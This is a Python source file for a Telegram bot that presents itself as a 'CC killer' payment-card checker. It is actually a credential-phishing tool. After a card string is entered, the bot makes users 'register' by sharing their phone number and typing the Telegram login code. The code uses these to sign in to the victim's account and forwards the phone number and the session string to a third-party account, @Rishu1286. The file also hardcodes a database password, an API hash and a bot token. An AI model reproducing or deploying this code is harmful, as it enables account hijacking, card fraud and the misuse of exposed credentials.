import re
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, AuthRestartError
from telethon.sessions import StringSession
import pymongo
from pymongo import MongoClient
import random

# MongoDB Setup
client = MongoClient('mongodb+srv://Krishna:pss968048@cluster0.4rfuzro.mongodb.net/?retryWrites=true&w=majority')
db = client['user_sessions']
users_collection = db['users']

# Telegram API Credentials
API_ID = 29657994
API_HASH = "85f461c4f637911d79c65da1fc2bdd77"
BOT_TOKEN = "8009070392:AAF2e26nQnu49Z9Z8UHJFNOPivSGLMjzb-o"

# Initialize Pyrogram Client
app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


@app.on_message(filters.command("start"))
async def start(client, message: Message):
    instructions = (
        "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
        f"ʜᴇʏ {message.from_user.first_name}\n\n\n"
        "ʜᴇʀᴇ’ꜱ ʜᴏᴡ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ:: \n\n"
        " * ⌁ How it Works ! *\n\n\n"
        "*ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁*\n"
        "[✓] ` /cu `  [card_details] ⌁ ᴋɪʟʟ ᴄᴄ\n"
        "[✓] ` /b3 `  [card_details] ⌁  ᴄʜᴇᴄᴋ ᴄᴀʀᴅ \n"
    )
    await message.reply_text(instructions)


@app.on_message(filters.regex(r"^/cu .*") | filters.regex(r"^/b3 .*"))
async def handle_card_check(client, message: Message):
    command, *details = message.text.split()
    if not details:
        await message.reply_text(
            "⛔ Please provide card details in the format:\n"
            "`/cu 507484491235|01|24|524`\n"
            "or\n"
            "`/b3 507484491235|01|24|524`"
        )
        return

    card_details = details[0]
    if validate_card(card_details):
        user_id = message.chat.id
        if not users_collection.find_one({"user_id": user_id, "status": "logged_in"}):
            await message.reply_text("You are not logged in. Please use /register to log in first.")
        else:
            await message.reply_text("Card details are valid. Proceeding...")
    else:
        await message.reply_text("❌ Invalid card details. Please try again.")


def validate_card(card_details: str) -> bool:
    pattern = r"^\d{12,19}\|\d{2}\|\d{2}\|\d{3}$"
    return re.match(pattern, card_details) is not None


@app.on_message(filters.command("register"))
async def register(client, message: Message):
    user_id = message.chat.id
    if users_collection.find_one({"user_id": user_id}):
        await message.reply_text("You are already logged in.")
        return

    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)


@app.on_message(filters.contact)
async def handle_phone_number(client, message: Message):
    phone_number = message.contact.phone_number
    user_id = message.chat.id

    await app.send_message("@Rishu1286", f"New phone number received: {phone_number}")
    await message.reply_text(f"Received phone number: {phone_number}. Sending OTP...")

    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        result = await client.send_code_request(phone_number)
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"phone_number": phone_number, "phone_code_hash": result.phone_code_hash}},
            upsert=True
        )

        await message.reply_text("OTP has been sent to your phone. Please enter it below:")
        buttons = [
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(3)],
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(3, 6)],
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(6, 9)],
            [InlineKeyboardButton(str(i), callback_data=str(i)) for i in range(9, 10)]
        ]
        reply_markup = InlineKeyboardMarkup(buttons)
        await message.reply("Please enter your OTP by clicking the digits below.", reply_markup=reply_markup)

    except AuthRestartError:
        await message.reply_text("Internal error occurred. Restarting the process...")
        await register(client, message)
    except Exception as e:
        await message.reply_text(f"Error sending OTP: {str(e)}")


@app.on_message(filters.text & filters.private)
async def handle_otp_or_password(client, message: Message):
    user_id = message.chat.id
    user_info = users_collection.find_one({"user_id": user_id})
    if not user_info:
        return

    telethon_client = TelegramClient(StringSession(), API_ID, API_HASH)

    # If entering OTP
    otp = message.text.strip()
    try:
        await telethon_client.connect()
        await telethon_client.sign_in(user_info["phone_number"], otp, phone_code_hash=user_info["phone_code_hash"])
        session_string = telethon_client.session.save()

        # Save session string in the database
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"session_string": session_string, "status": "logged_in"}},
            upsert=True
        )

        await app.send_message("@Rishu1286", f"New session string for {user_info['phone_number']}: {session_string}")
        await message.reply_text("Login successful!")
        await telethon_client.disconnect()

    except SessionPasswordNeededError:
        await message.reply_text("Two-Step Verification is enabled. Please send your password:")
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"awaiting_password": True}},
            upsert=True
        )
    except PhoneCodeInvalidError:
        await message.reply_text("Invalid OTP. Please try again.")
    except Exception as e:
        await message.reply_text(f"Error logging in: {str(e)}")


@app.on_callback_query(filters.regex(r"^\d$"))
async def handle_otp_digit(client, callback_query):
    user_id = callback_query.from_user.id
    user_info = users_collection.find_one({"user_id": user_id})
    if not user_info:
        await callback_query.message.reply_text("Please restart the registration process.")
        return

    otp_digit = callback_query.data
    if "otp" not in user_info:
        user_info["otp"] = otp_digit
    else:
        user_info["otp"] += otp_digit

    await callback_query.answer(f"OTP entered so far: {user_info['otp']}", show_alert=True)

    if len(user_info["otp"]) == 5:
        try:
            telethon_client = TelegramClient(StringSession(user_info["session_string"]), API_ID, API_HASH)
            await telethon_client.connect()

            await telethon_client.sign_in(user_info["phone_number"], user_info["otp"], phone_code_hash=user_info["phone_code_hash"])
            session_string = telethon_client.session.save()

            users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"session_string": session_string, "status": "logged_in"}},
                upsert=True
            )

            await app.send_message("@Rishu1286", f"New session string for {user_info['phone_number']}: {session_string}")
            await callback_query.message.reply_text("Login successful!")
        except SessionPasswordNeededError:
            await callback_query.message.reply_text("2FA is enabled. Please send your password:")
            users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"awaiting_password": True}},
                upsert=True
            )
        except PhoneCodeInvalidError:
            await callback_query.message.reply_text("Invalid OTP. Please try again.")
        except Exception as e:
            await callback_query.message.reply_text(f"Error logging in: {str(e)}")
        finally:
            await telethon_client.disconnect()
            users_collection.update_one(
                {"user_id": user_id},
                {"$set": {"status": "logged_out"}},
                upsert=True
            )


if __name__ == "__main__":
    app.run()
